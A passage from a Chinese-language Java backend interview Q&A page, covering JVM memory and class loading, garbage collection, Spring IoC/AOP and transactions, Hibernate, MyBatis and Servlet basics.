空间占新生代的绝大部分，所以 Minor GC 的频率得以降低。当然，使用两个 Survivor 这种方式我们也付出了一定的代价，如 10% 的空间浪费、复制对象的开销等。</p><h4 id="JVM分区都有哪些？"><a href="#JVM分区都有哪些？" class="headerlink" title="JVM分区都有哪些？"></a>JVM分区都有哪些？</h4><p>1.8 之前</p><p><img src="/interview/interview/java-server-enginer-interview/308572_1537962738034_560D4514BC25F890A38519E8A401BBF0.png" alt="img" style="zoom:60%;"></p><p>java 内存通常被划分为5个区域：</p><ul><li>程序计数器（Program Count Register）用于实现指令周期循环</li><li>本地方法栈（Native Stack）</li><li>方法区（Methon Area）</li><li>栈（Stack）</li><li>堆（Heap）</li></ul><p>1.8同1.7比，最大的差别就是：<strong>元数据区取代了永久代</strong>。元空间的本质和永久代类似，都是对JVM规范中方法区的实现。不过元空间与永久代之间最大的区别在于：<strong>元数据空间并不在虚拟机中，而是使用本地内存</strong>。</p><p><img src="/interview/interview/java-server-enginer-interview/70.jpeg" alt="内存分布"></p><p>java 内存结构概念的区分：</p><ul><li>Java 内存模型（Java Memory Model（JMM）），用于多线程编程，例如 ThreadLocal 和 全局变量的区别。</li><li>JVM 内存结构（JVM内存分区）Java虚拟机的运行时区域有关，用于内存调优。</li><li>Java 对象结构，用于日常编码的优化。</li></ul><h4 id="类的加载过程有哪些？"><a href="#类的加载过程有哪些？" class="headerlink" title="类的加载过程有哪些？"></a>类的加载过程有哪些？</h4><p><img src="/interview/interview/java-server-enginer-interview/308572_1537962641528_95106A90F455887E4A4B298735A4641B.png" alt="img" style="zoom:60%;"></p><p>JVM类加载机制分为五个部分：</p><ol><li>加载，加载是类加载过程中的一个阶段，这个阶段会在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的入口。注意这里不一定非得要从一个Class文件获取，这里既可以从ZIP包中读取（比如从jar包和war包中读取），也可以在运行时计算生成（动态代理），也可以由其它文件生成（比如将JSP文件转换成对应的Class类）。</li><li>验证，这一阶段的主要目的是为了确保Class文件的字节流中包含的信息是否符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。</li><li>准备，准备阶段是正式为类变量分配内存并设置类变量的初始值阶段，即在方法区中分配这些变量所使用的内存空间。注意这里所说的初始值概念，比如一个类变量定义为：</li><li>解析，解析阶段是指虚拟机将常量池中的符号引用替换为直接引用的过程。</li><li>初始化。初始化阶段是类加载最后一个阶段，前面的类加载阶段之后，除了在加载阶段可以自定义类加载器以外，其它操作都由JVM主导。到了初始阶段，才开始真正执行类中定义的Java程序代码。</li></ol><p>JVM通过双亲委派模型进行类的加载，当然我们也可以通过继承java.lang.ClassLoader实现自定义的类加载器。</p><p><img src="/interview/interview/java-server-enginer-interview/308572_1537962385800_7142B8354CA8A352B2B805F997C71549.png" alt="img"></p><p>当一个类加载器收到类加载任务，会先交给其父类加载器去完成，因此最终加载任务都会传递到顶层的启动类加载器，只有当父类加载器无法完成加载任务时，才会尝试执行加载任务。采用双亲委派的一个好处是比如加载位于rt.jar包中的类java.lang.Object，不管是哪个加载器加载这个类，最终都是委托给顶层的启动类加载器进行加载，这样就保证了使用不同的类加载器最终得到的都是同样一个Object对象。</p><p>例如 Spring boot项目加载过程：</p><ul><li>JVM 类加载器</li><li>Spring boot 类加载器</li><li>用户自定义的类加载器</li></ul><h4 id="垃圾回收器的基本原理是什么？还有垃圾回收器可以马上回收内存吗？并且有什么办法可以主动通知虚拟机进行垃圾回收呢？"><a href="#垃圾回收器的基本原理是什么？还有垃圾回收器可以马上回收内存吗？并且有什么办法可以主动通知虚拟机进行垃圾回收呢？" class="headerlink" title="垃圾回收器的基本原理是什么？还有垃圾回收器可以马上回收内存吗？并且有什么办法可以主动通知虚拟机进行垃圾回收呢？"></a>垃圾回收器的基本原理是什么？还有垃圾回收器可以马上回收内存吗？并且有什么办法可以主动通知虚拟机进行垃圾回收呢？</h4><p>对于GC来说，当程序员创建对象时，GC就开始监控这个对象的地址、大小以及使用情况。通常，GC采用有向图的方式记录和管理堆(heap)中的所有对象。通过这种方式确定哪些对象是”可达的”，哪些对象是”不可达的”。当GC确定一些对象为”不可达”时，GC就有责任回收这些内存空间。可以。程序员可以手动执行System.gc()，通知GC运行，但是Java语言规范并不保证GC一定会执行。</p><h4 id="在java中会存在内存泄漏吗？请简单描述一下。"><a href="#在java中会存在内存泄漏吗？请简单描述一下。" class="headerlink" title="在java中会存在内存泄漏吗？请简单描述一下。"></a>在java中会存在内存泄漏吗？请简单描述一下。</h4><p>有两类主要的Java内存泄漏:</p><ul><li>不再需要的对象引用<ul><li>在向数组添加对象以后遗漏了对于他们的处理</li><li>直到你再次使用对象的时候都不释放引用. 比如一个菜单指令可以插件一个对象实例引用并且不释放便于以后再次调用的时候使用, 但是也许永远不会发生.</li><li>在其他引用依然需要旧有状态的时候贸然修改对象状态. 比如当你为了在一个文本文件里面保存一些属性而使用一个数组, 诸如”字符个数”等字段在不再需要的时候依然保留在内存当中.</li><li>允许一个长久执行的线程所引用的对象. 设置引用为NULL也无济于事, 在线程退出和空闲之前, 对象不会被收集释放</li><li>循环引用</li></ul></li><li>未释放的系统资源<ul><li>Java方法可以定位Java实例意外的堆内存, 诸如针对视窗和位图的内存资源. Java常常通过JNI(Java Native Interface)调用C/C++子程序定位这些资源.</li><li>打开的各种流</li></ul></li></ul><h4 id="什么原因会导致minor-gc运行频繁？同样的，什么原因又会导致minor-gc运行很慢？"><a href="#什么原因会导致minor-gc运行频繁？同样的，什么原因又会导致minor-gc运行很慢？" class="headerlink" title="什么原因会导致minor gc运行频繁？同样的，什么原因又会导致minor gc运行很慢？"></a>什么原因会导致minor gc运行频繁？同样的，什么原因又会导致minor gc运行很慢？</h4><p>可能是堆内存太小，以及大对象的产生，大对象未及时进入老年代。</p><p>可以调整相关策略：</p><ol><li>调高堆内存</li><li>调低大对象进入老年代的阈值</li></ol><h4 id="静态变量存在内存什么位置"><a href="#静态变量存在内存什么位置" class="headerlink" title="静态变量存在内存什么位置?"></a>静态变量存在内存什么位置?</h4><p>方法区</p><h4 id="类加载机制，双亲委派模型，好处是什么？"><a href="#类加载机制，双亲委派模型，好处是什么？" class="headerlink" title="类加载机制，双亲委派模型，好处是什么？"></a>类加载机制，双亲委派模型，好处是什么？</h4><p>某个特定的类加载器在接到加载类的请求时，首先将加载任务委托给父类加载器，依次递归，如果父类加载器可以完成类加载任务，就成功返回；只有父类加载器无法完成此加载任务时，才自己去加载。</p><p>使用双亲委派模型的好处在于Java类随着它的类加载器一起具备了一种带有优先级的层次关系。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。</p><h2 id="Java-Web-相关问题"><a href="#Java-Web-相关问题" class="headerlink" title="Java Web 相关问题"></a>Java Web 相关问题</h2><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><h4 id="Spring中自动装配的方式有哪些？"><a href="#Spring中自动装配的方式有哪些？" class="headerlink" title="Spring中自动装配的方式有哪些？"></a>Spring中自动装配的方式有哪些？</h4><ul><li>no：不进行自动装配，手动设置Bean的依赖关系。</li><li>byName：根据Bean的名字进行自动装配。</li><li>byType：根据Bean的类型进行自动装配。</li><li>constructor：类似于byType，不过是应用于构造器的参数，如果正好有一个Bean与构造器的参数类型相同则可以自动装配，否则会导致错误。</li><li>autodetect：如果有默认的构造器，则通过constructor的方式进行自动装配，否则使用byType的方式进行自动装配。</li></ul><h4 id="Spring中Bean的作用域有哪些？"><a href="#Spring中Bean的作用域有哪些？" class="headerlink" title="Spring中Bean的作用域有哪些？"></a>Spring中Bean的作用域有哪些？</h4><p>在Spring的早期版本中，仅有两个作用域：singleton和prototype，前者表示Bean以单例的方式存在；后者表示每次从容器中调用Bean时，都会返回一个新的实例，prototype通常翻译为原型。</p><p>设计模式中的创建型模式中也有一个原型模式，原型模式也是一个常用的模式，例如做一个室内设计软件，所有的素材都在工具箱中，而每次从工具箱中取出的都是素材对象的一个原型，可以通过对象克隆来实现原型模式。Spring 2.x中针对WebApplicationContext新增了3个作用域，分别是：request（每次HTTP请求都会创建一个新的Bean）、session（同一个HttpSession共享同一个Bean，不同的HttpSession使用不同的Bean）和globalSession（同一个全局Session共享一个Bean）。</p><p>单例模式和原型模式都是重要的设计模式。一般情况下，无状态或状态不可变的类适合使用单例模式。在传统开发中，由于DAO持有Connection这个非线程安全对象因而没有使用单例模式；但在Spring环境下，所有DAO类对可以采用单例模式，因为Spring利用AOP和Java API中的ThreadLocal对非线程安全的对象进行了特殊处理。</p><h4 id="什么是IoC和DI？并且简要说明一下DI是如何实现的？"><a href="#什么是IoC和DI？并且简要说明一下DI是如何实现的？" class="headerlink" title="什么是IoC和DI？并且简要说明一下DI是如何实现的？"></a>什么是IoC和DI？并且简要说明一下DI是如何实现的？</h4><p>IoC叫控制反转，是Inversion of Control的缩写，DI（Dependency Injection）叫依赖注入，是对IoC更简单的诠释。控制反转是把传统上由程序代码直接操控的对象的调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的”控制反转”就是对组件对象控制权的转移，从程序代码本身转移到了外部容器，由容器来创建对象并管理对象之间的依赖关系。IoC体现了好莱坞原则 - “Don’t call me, we will call you”。依赖注入的基本原则是应用组件不应该负责查找资源或者其他依赖的协作对象。配置对象的工作应该由容器负责，查找资源的逻辑应该从应用组件的代码中抽取出来，交给容器来完成。DI是对IoC更准确的描述，即组件之间的依赖关系由容器在运行期决定，形象的来说，即由容器动态的将某种依赖关系注入到组件之中。</p><p>一个类A需要用到接口B中的方法，那么就需要为类A和接口B建立关联或依赖关系，最原始的方法是在类A中创建一个接口B的实现类C的实例，但这种方法需要开发人员自行维护二者的依赖关系，也就是说当依赖关系发生变动的时候需要修改代码并重新构建整个系统。如果通过一个容器来管理这些对象以及对象的依赖关系，则只需要在类A中定义好用于关联接口B的方法（构造器或setter方法），将类A和接口B的实现类C放入容器中，通过对容器的配置来实现二者的关联。<br>依赖注入可以通过setter方法注入（设值注入）、构造器注入和接口注入三种方式来实现，Spring支持setter注入和构造器注入，通常使用构造器注入来注入必须的依赖关系，对于可选的依赖关系，则setter注入是更好的选择，setter注入需要类提供无参构造器或者无参的静态工厂方法来创建对象。</p><h4 id="Spring中BeanFactory和ApplicationContext的区别是什么？"><a href="#Spring中BeanFactory和ApplicationContext的区别是什么？" class="headerlink" title="Spring中BeanFactory和ApplicationContext的区别是什么？"></a>Spring中BeanFactory和ApplicationContext的区别是什么？</h4><p>BeanFactory是spring中比较原始，比较古老的Factory。因为比较古老，所以BeanFactory无法支持spring插件，例如：AOP、Web应用等功能。</p><p>ApplicationContext是BeanFactory的子类，因为古老的BeanFactory无法满足不断更新的spring的需求，于是ApplicationContext就基本上代替了BeanFactory的工作，以一种更面向框架的工作方式以及对上下文进行分层和实现继承，并在这个基础上对功能进行扩展：</p><ol><li>MessageSource, 提供国际化的消息访问</li><li>资源访问（如URL和文件）</li><li>事件传递</li><li>Bean的自动装配</li><li>各种不同应用层的Context实现</li></ol><h4 id="springIOC原理是什么？"><a href="#springIOC原理是什么？" class="headerlink" title="springIOC原理是什么？"></a>springIOC原理是什么？</h4><p>IoC的一个重点是在系统运行中，动态的向某个对象提供它所需要的其他对象。这一点是通过DI（Dependency Injection，依赖注入）来实现的。</p><h4 id="如果你要实现IOC需要怎么做？请简单描述一下实现步骤？"><a href="#如果你要实现IOC需要怎么做？请简单描述一下实现步骤？" class="headerlink" title="如果你要实现IOC需要怎么做？请简单描述一下实现步骤？"></a>如果你要实现IOC需要怎么做？请简单描述一下实现步骤？</h4><p>定义用来描述bean的配置的Java类</p><p>解析bean的配置，將bean的配置信息转换为上面的BeanDefinition对象保存在内存中，spring中采用HashMap进行对象存储，其中会用到一些xml解析技术</p><p>遍历存放BeanDefinition的HashMap对象，逐条取出BeanDefinition对象，获取bean的配置信息，利用Java的反射机制实例化对象，將实例化后的对象保存在另外一个Map中即可。</p><h4 id="依赖注入的方式有哪几种？"><a href="#依赖注入的方式有哪几种？" class="headerlink" title="依赖注入的方式有哪几种？"></a>依赖注入的方式有哪几种？</h4><ol><li>Set注入 </li><li>构造器注入 </li><li>接口注入</li></ol><h4 id="Controller和-RestController的区别是什么？"><a href="#Controller和-RestController的区别是什么？" class="headerlink" title="@Controller和@RestController的区别是什么？"></a>@Controller和@RestController的区别是什么？</h4><p>@RestController注解相当于@ResponseBody ＋ @Controller合在一起的作用</p><h4 id="autowired-和resource区别是什么？"><a href="#autowired-和resource区别是什么？" class="headerlink" title="autowired 和resource区别是什么？"></a>autowired 和resource区别是什么？</h4><p>@Autowired</p><p>@Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired;只按照byType注入。</p><p>@Autowired注解是按照类型（byType）装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许null值，可以设置它的required属性为false。如果我们想使用按照名称（byName）来装配，可以结合@Qualifier注解一起使用。</p><p>@Resource默认按照ByName自动注入，由J2EE提供，需要导入包javax.annotation.Resource。@Resource有两个重要的属性：name和type，而Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以，如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不制定name也不制定type属性，这时将通过反射机制使用byName自动注入策略。</p><h4 id="请介绍一下bean的生命周期"><a href="#请介绍一下bean的生命周期" class="headerlink" title="请介绍一下bean的生命周期"></a>请介绍一下bean的生命周期</h4><p><img src="/interview/interview/java-server-enginer-interview/308572_1537967995043_4D7CF33471A392D943F00167D1C86C10.png" alt="img" style="zoom:33%;"></p><h4 id="Spring支持的事务管理类型有哪些？"><a href="#Spring支持的事务管理类型有哪些？" class="headerlink" title="Spring支持的事务管理类型有哪些？"></a>Spring支持的事务管理类型有哪些？</h4><p>Spring支持编程式事务管理和声明式事务管理。许多Spring框架的用户选择声明式事务管理，因为这种方式和应用程序的关联较少，因此更加符合轻量级容器的概念。声明式事务管理要优于编程式事务管理，尽管在灵活性方面它弱于编程式事务管理，因为编程式事务允许你通过代码控制业务。</p><p>事务分为全局事务和局部事务。全局事务由应用服务器管理，需要底层服务器JTA支持（如WebLogic、WildFly等）。局部事务和底层采用的持久化方案有关，例如使用JDBC进行持久化时，需要使用Connetion对象来操作事务；而采用Hibernate进行持久化时，需要使用Session对象来操作事务。</p><p>这些事务的父接口都是PlatformTransactionManager。Spring的事务管理机制是一种典型的策略模式，PlatformTransactionManager代表事务管理接口，该接口定义了三个方法，该接口并不知道底层如何管理事务，但是它的实现类必须提供getTransaction()方法（开启事务）、commit()方法（提交事务）、rollback()方法（回滚事务）的多态实现，这样就可以用不同的实现类代表不同的事务管理策略。使用JTA全局事务策略时，需要底层应用服务器支持，而不同的应用服务器所提供的JTA全局事务可能存在细节上的差异，因此实际配置全局事务管理器是可能需要使用JtaTransactionManager的子类，如：WebLogicJtaTransactionManager（Oracle的WebLogic服务器提供）、UowJtaTransactionManager（IBM的WebSphere服务器提供）等。</p><h4 id="AOP中的连接点（Joinpoint）、切点（Pointcut）、增强（Advice）、引介（Introduction）、织入（Weaving）、切面（Aspect）这些概念？"><a href="#AOP中的连接点（Joinpoint）、切点（Pointcut）、增强（Advice）、引介（Introduction）、织入（Weaving）、切面（Aspect）这些概念？" class="headerlink" title="AOP中的连接点（Joinpoint）、切点（Pointcut）、增强（Advice）、引介（Introduction）、织入（Weaving）、切面（Aspect）这些概念？"></a>AOP中的连接点（Joinpoint）、切点（Pointcut）、增强（Advice）、引介（Introduction）、织入（Weaving）、切面（Aspect）这些概念？</h4><ol><li>连接点（Joinpoint）：程序执行的某个特定位置（如：某个方法调用前、调用后，方法抛出异常后）。一个类或一段程序代码拥有一些具有边界性质的特定点，这些代码中的特定点就是连接点。Spring仅支持方法的连接点。</li><li>切点（Pointcut）：如果连接点相当于数据中的记录，那么切点相当于查询条件，一个切点可以匹配多个连接点。Spring AOP的规则解析引擎负责解析切点所设定的查询条件，找到对应的连接点。</li><li><p>增强（Advice）：增强是织入到目标类连接点上的一段程序代码。Spring提供的增强接口都是带方位名的，如：BeforeAdvice、AfterReturningAdvice、ThrowsAdvice等。</p></li><li><p>引介（Introduction）：引介是一种特殊的增强，它为类添加一些属性和方法。这样，即使一个业务类原本没有实现某个接口，通过引介功能，可以动态的未该业务类添加接口的实现逻辑，让业务类成为这个接口的实现类。</p></li><li>织入（Weaving）：织入是将增强添加到目标类具体连接点上的过程，AOP有三种织入方式：①编译期织入：需要特殊的Java编译期（例如AspectJ的ajc）；②装载期织入：要求使用特殊的类加载器，在装载类的时候对类进行增强；③运行时织入：在运行时为目标类生成代理实现增强。Spring采用了动态代理的方式实现了运行时织入，而AspectJ采用了编译期织入和装载期织入的方式。</li><li>切面（Aspect）：切面是由切点和增强（引介）组成的，它包括了对横切关注功能的定义，也包括了对连接点的定义。</li></ol><h4 id="持久层设计要考虑的问题有哪些？请谈一下你用过的持久层框架都有哪些？"><a href="#持久层设计要考虑的问题有哪些？请谈一下你用过的持久层框架都有哪些？" class="headerlink" title="持久层设计要考虑的问题有哪些？请谈一下你用过的持久层框架都有哪些？"></a>持久层设计要考虑的问题有哪些？请谈一下你用过的持久层框架都有哪些？</h4><ul><li>Hibernate</li><li>MyBatis</li><li>jOOQ</li><li>Spring data JDBC</li></ul><h3 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h3><h4 id="实体对象的三种状态是什么？以及对应的转换关系是什么？"><a href="#实体对象的三种状态是什么？以及对应的转换关系是什么？" class="headerlink" title="实体对象的三种状态是什么？以及对应的转换关系是什么？"></a>实体对象的三种状态是什么？以及对应的转换关系是什么？</h4><p>最新的Hibernate文档中为Hibernate对象定义了四种状态（原来是三种状态，面试的时候基本上问的也是三种状态），分别是：瞬时态（new, or transient）、持久态（managed, or persistent）、游状态（detached）和移除态（removed，以前Hibernate文档中定义的三种状态中没有移除态），如下图所示，就以前的Hibernate文档中移除态被视为是瞬时态。</p><ol><li>瞬时态：当new一个实体对象后，这个对象处于瞬时态，即这个对象只是一个保存临时数据的内存区域，如果没有变量引用这个对象，则会被JVM的垃圾回收机制回收。这个对象所保存的数据与数据库没有任何关系，除非通过Session的save()、saveOrUpdate()、persist()、merge()方法把瞬时态对象与数据库关联，并把数据插入或者更新到数据库，这个对象才转换为持久态对象。</li><li>持久态：持久态对象的实例在数据库中有对应的记录，并拥有一个持久化标识（ID）。对持久态对象进行delete操作后，数据库中对应的记录将被删除，那么持久态对象与数据库记录不再存在对应关系，持久态对象变成移除态（可以视为瞬时态）。持久态对象被修改变更后，不会马上同步到数据库，直到数据库事务提交。</li><li>游离态：当Session进行了close()、clear()、evict()或flush()后，实体对象从持久态变成游离态，对象虽然拥有持久和与数据库对应记录一致的标识值，但是因为对象已经从会话中清除掉，对象不在持久化管理之内，所以处于游离态（也叫脱管态）。游离态的对象与临时状态对象是十分相似的，只是它还含有持久化标识。</li></ol><h4 id="Hibernate的悲观锁和乐观锁机制是什么？"><a href="#Hibernate的悲观锁和乐观锁机制是什么？" class="headerlink" title="Hibernate的悲观锁和乐观锁机制是什么？"></a>Hibernate的悲观锁和乐观锁机制是什么？</h4><p>Hibernate支持悲观锁和乐观锁两种锁机制。悲观锁，顾名思义悲观的认为在数据处理过程中极有可能存在修改数据的并发事务（包括本系统的其他事务或来自外部系统的事务），于是将处理的数据设置为锁定状态。悲观锁必须依赖数据库本身的锁机制才能真正保证数据访问的排他性，乐观锁，顾名思义，对并发事务持乐观态度（认为对数据的并发操作不会经常性的发生），通过更加宽松的锁机制来解决由于悲观锁排他性的数据访问对系统性能造成的严重影响。最常见的乐观锁是通过数据版本标识来实现的，读取数据时获得数据的版本号，更新数据时将此版本号加1，然后和数据库表对应记录的当前版本号进行比较，如果提交的数据版本号大于数据库中此记录的当前版本号则更新数据，否则认为是过期数据无法更新。Hibernate中通过Session的get()和load()方法从数据库中加载对象时可以通过参数指定使用悲观锁；而乐观锁可以通过给实体类加整型的版本字段再通过XML或@Version注解进行配置。</p><p>使用乐观锁会增加了一个版本字段，很明显这需要额外的空间来存储这个版本字段，浪费了空间，但是乐观锁会让系统具有更好的并发性，这是对时间的节省。因此乐观锁也是典型的空间换时间的策略。</p><h4 id="Hibernate常见优化策略。"><a href="#Hibernate常见优化策略。" class="headerlink" title="Hibernate常见优化策略。"></a>Hibernate常见优化策略。</h4><ol><li>制定合理的缓存策略（二级缓存、查询缓存）。</li><li>采用合理的Session管理机制。</li><li>尽量使用延迟加载特性。</li><li>设定合理的批处理参数。</li><li>如果可以，选用UUID作为主键生成器。</li><li>如果可以，选用基于版本号的乐观锁替代悲观锁。</li><li>在开发过程中, 开启hibernate.show_sql选项查看生成的SQL，从而了解底层的状况；开发完成后关闭此选项。</li><li>考虑数据库本身的优化，合理的索引、恰当的数据分区策略等都会对持久层的性能带来可观的提升，但这些需要专业的DBA（数据库管理员）提供支持。</li></ol><h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><h4 id="MyBatis中的动态SQL是什么意思？"><a href="#MyBatis中的动态SQL是什么意思？" class="headerlink" title="MyBatis中的动态SQL是什么意思？"></a>MyBatis中的动态SQL是什么意思？</h4><p>对于一些复杂的查询，我们可能会指定多个查询条件，但是这些条件可能存在也可能不存在，需要根据用户指定的条件动态生成SQL语句。如果不使用持久层框架我们可能需要自己拼装SQL语句，还好MyBatis提供了动态SQL的功能来解决这个问题。MyBatis中用于实现动态SQL的元素主要有：</p><ul><li>if</li><li>choose / when / otherwise</li><li>trim</li><li>where</li><li>set</li><li>foreach</li></ul><h4 id="MyBatis中命名空间（namespace）的作用是什么？"><a href="#MyBatis中命名空间（namespace）的作用是什么？" class="headerlink" title="MyBatis中命名空间（namespace）的作用是什么？"></a>MyBatis中命名空间（namespace）的作用是什么？</h4><p>在大型项目中，可能存在大量的SQL语句，这时候为每个SQL语句起一个唯一的标识（ID）就变得并不容易了。为了解决这个问题，在MyBatis中，可以为每个映射文件起一个唯一的命名空间，这样定义在这个映射文件中的每个SQL语句就成了定义在这个命名空间中的一个ID。只要我们能够保证每个命名空间中这个ID是唯一的，即使在不同映射文件中的语句ID相同，也不会再产生冲突了。</p><h4 id="和-的区别是什么？"><a href="#和-的区别是什么？" class="headerlink" title="#{}和${}的区别是什么？"></a>#{}和${}的区别是什么？</h4><p>#{}是预编译处理，${}是字符串替换。</p><p>Mybatis在处理#{}时，会将sql中的#{}替换为?号，调用PreparedStatement的set方法来赋值；</p><p>Mybatis在处理${}时，就是把${}替换成变量的值。</p><p>使用#{}可以有效的防止SQL注入，提高系统安全性。</p><h4 id="模糊查询like语句该怎么写"><a href="#模糊查询like语句该怎么写" class="headerlink" title="模糊查询like语句该怎么写?"></a>模糊查询like语句该怎么写?</h4><p>定义一个变量</p><pre><code>&lt;select id=&quot;selectBlogsLike&quot; resultType=&quot;Blog&quot;&gt;  &lt;bind name=&quot;pattern&quot; value=&quot;&#39;%&#39; + _parameter.getTitle() + &#39;%&#39;&quot; /&gt;  SELECT * FROM BLOG  WHERE title LIKE #{pattern}&lt;/select&gt;</code></pre><h4 id="MyBatis-实现一对一有几种方式-具体怎么操作的？"><a href="#MyBatis-实现一对一有几种方式-具体怎么操作的？" class="headerlink" title="MyBatis 实现一对一有几种方式?具体怎么操作的？"></a>MyBatis 实现一对一有几种方式?具体怎么操作的？</h4><pre><code>有联合查询和嵌套查询,联合查询是几个表联合查询,只查询一次,通过在 resultMap 里面配置 association 节点配置一对一的类就可以完成;嵌套查询是先查一个表,根据这个表里面的结果的外键 id,去再另外一个表里面查询数据,也是通过 association 配置,但另外一个表的查询通过 select 属性配置。</code></pre><h3 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h3><h4 id="Spring-MVC的工作原理是怎样的？"><a href="#Spring-MVC的工作原理是怎样的？" class="headerlink" title="Spring MVC的工作原理是怎样的？"></a>Spring MVC的工作原理是怎样的？</h4><ul><li>客户端的所有请求都交给前端控制器DispatcherServlet来处理，它会负责调用系统的其他模块来真正处理用户的请求。</li><li>DispatcherServlet收到请求后，将根据请求的信息（包括URL、HTTP协议方法、请求头、请求参数、Cookie等）以及HandlerMapping的配置找到处理该请求的Handler（任何一个对象都可以作为请求的Handler）。</li><li>在这个地方Spring会通过HandlerAdapter对该处理器进行封装。</li><li>HandlerAdapter是一个适配器，它用统一的接口对各种Handler中的方法进行调用。</li><li>Handler完成对用户请求的处理后，会返回一个ModelAndView对象给DispatcherServlet，ModelAndView顾名思义，包含了数据模型以及相应的视图的信息。</li><li>ModelAndView的视图是逻辑视图，DispatcherServlet还要借助ViewResolver完成从逻辑视图到真实视图对象的解析工作。</li><li>当得到真正的视图对象后，DispatcherServlet会利用视图对象对模型数据进行渲染。</li><li>客户端得到响应，可能是一个普通的HTML页面，也可以是XML或JSON字符串，还可以是一张图片或者一个PDF文件。</li></ul><h4 id="SpringMVC-的运行机制？以及运行机制的流程是什么？"><a href="#SpringMVC-的运行机制？以及运行机制的流程是什么？" class="headerlink" title="SpringMVC 的运行机制？以及运行机制的流程是什么？"></a>SpringMVC 的运行机制？以及运行机制的流程是什么？</h4><ol><li><p>用户发送请求时会先从DispathcherServler的doService方法开始，在该方法中会将ApplicationContext、localeResolver、themeResolver等对象添加到request中，紧接着就是调用doDispatch方法。</p></li><li><p>进入该方法后首先会检查该请求是否是文件上传的请求(校验的规则是是否是post并且contenttType是否为multipart/为前缀)即调用的是checkMultipart方法；如果是的将request包装成MultipartHttpServletRequest。</p></li><li><p>然后调用getHandler方法来匹配每个HandlerMapping对象，如果匹配成功会返回这个Handle的处理链HandlerExecutionChain对象，在获取该对象的内部其实也获取我们自定定义的拦截器，并执行了其中的方法。</p></li><li><p>执行拦截器的preHandle方法，如果返回false执行afterCompletion方法并理解返回</p></li><li><p>通过上述获取到了HandlerExecutionChain对象，通过该对象的getHandler()方法获得一个object通过HandlerAdapter进行封装得到HandlerAdapter对象。</p></li><li><p>该对象调用handle方法来执行Controller中的方法，该对象如果返回一个ModelAndView给DispatcherServlet。</p></li><li><p>DispatcherServlet借助ViewResolver完成逻辑试图名到真实视图对象的解析，得到View后DispatcherServlet使用这个View对ModelAndView中的模型数据进行视图渲染。</p></li></ol><h3 id="WEB-通用编程"><a href="#WEB-通用编程" class="headerlink" title="WEB 通用编程"></a>WEB 通用编程</h3><h4 id="怎么实现一个节流算法？"><a href="#怎么实现一个节流算法？" class="headerlink" title="怎么实现一个节流算法？"></a>怎么实现一个节流算法？</h4><ol><li>计数器</li><li>滑动窗口</li><li>漏桶法</li><li>令牌桶</li></ol><p>一般都不会在应用层面做这个事情，一般在网关完成。</p><h4 id="使用Servlet如何获取用户配置的初始化参数以及服务器上下文参数？"><a href="#使用Servlet如何获取用户配置的初始化参数以及服务器上下文参数？" class="headerlink" title="使用Servlet如何获取用户配置的初始化参数以及服务器上下文参数？"></a>使用Servlet如何获取用户配置的初始化参数以及服务器上下文参数？</h4><p>可以通过重写Servlet接口的init(ServletConfig)方法并通过ServletConfig对象的getInitParameter()方法来获取Servlet的初始化参数。可以通过ServletConfig对象的getServletContext()方法获取ServletContext对象，并通过该对象的getInitParameter()方法来获取服务器上下文参数。当然，ServletContext对象也在处理用户请求的方法（如doGet()方法）中通过请求对象的getServletContext()方法来获得。</p><h4 id="请问使用Servlet如何获取用户提交的查询参数以及表单数据？"><a href="#请问使用Servlet如何获取用户提交的查询参数以及表单数据？" class="headerlink" title="请问使用Servlet如何获取用户提交的查询参数以及表单数据？"></a>请问使用Servlet如何获取用户提交的查询参数以及表单数据？</h4><p>可以通过请求对象（HttpServletRequest）的getParameter()方法通过参数名获得参数值。如果有包含多个值的参数（例如复选框），可以通过请求对象的getParameterValues()方法获得。当然也可以通过请求对象的getParameterMap()获得一个参数名和参数值的映射（Map）。</p><h4 id="如何在基于Java的Web项目中实现文件上传和下载？"><a href="#如何在基于Java的Web项目中实现文件上传和下载？" class="headerlink" title="如何在基于Java的Web项目中实现文件上传和下载？"></a>如何在基于Java的Web项目中实现文件上传和下载？</h4><p>在Sevlet 3 以前，Servlet API中没有支持上传功能的API，因此要实现上传功能需要引入第三方工具从POST请求中获得上传的附件或者通过自行处理输入流来获得上传的文件，我们推荐使用Apache的commons-fileupload。</p><h4 id="Servlet接口中有哪些方法？"><a href="#Servlet接口中有哪些方法？" class="headerlink" title="Servlet接口中有哪些方法？"></a>Servlet接口中有哪些方法？</h4><p>Servlet接口定义了5个方法，其中前三个方法与Servlet生命周期相关：</p><ul><li>void init(ServletConfig config) throws ServletException</li><li>void service(ServletRequest req, ServletResponse resp) throws ServletException, java.io.IOException</li><li>void destory()</li><li>java.lang.String getServletInfo()</li><li>ServletConfig getServletConfig()</li></ul><p>Web容器加载Servlet并将其实例化后，Servlet生命周期开始，容器运行其init()方法进行Servlet的初始化；请求到达时调用Servlet的service()方法，service()方法会根据需要调用与请求对应的doGet或doPost等方法；当服务器关闭或项目被卸载时服务</p><p>器会将Servlet实例销毁，此时会调用Servlet的destroy()方法。</p><h4 id="Servlet和CGI的区别"><a href="#Servlet和CGI的区别" class="headerlink" title="Servlet和CGI的区别?"></a>Servlet和CGI的区别?</h4><p>Servlet与CGI的区别在于Servlet处于服务器进程中，它通过多线程方式运行其service()方法，一个实例可以服务于多个请求，并且其实例一般不会销毁，而CGI对每个请求都产生新的进程，服务完成后就销毁，所以效率上低于Servlet。</p><h4 